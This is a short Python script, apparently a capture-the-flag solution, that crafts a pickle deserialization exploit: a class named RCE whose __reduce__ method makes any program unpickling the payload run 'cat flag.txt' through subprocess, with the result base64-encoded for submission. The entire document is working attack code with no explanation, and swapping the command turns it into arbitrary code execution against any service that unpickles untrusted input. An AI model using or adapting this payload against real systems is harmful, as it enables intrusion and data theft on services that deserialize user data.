import pickle
import base64
import subprocess
import os

class RCE(object):
    def __reduce__(self):
        return subprocess.check_output, (['cat', 'flag.txt'],)


pickled = pickle.dumps({'secret': RCE() },protocol=0)
#pickled = pickle.dumps(RCE(), 0)
print(base64.b64encode(pickled))
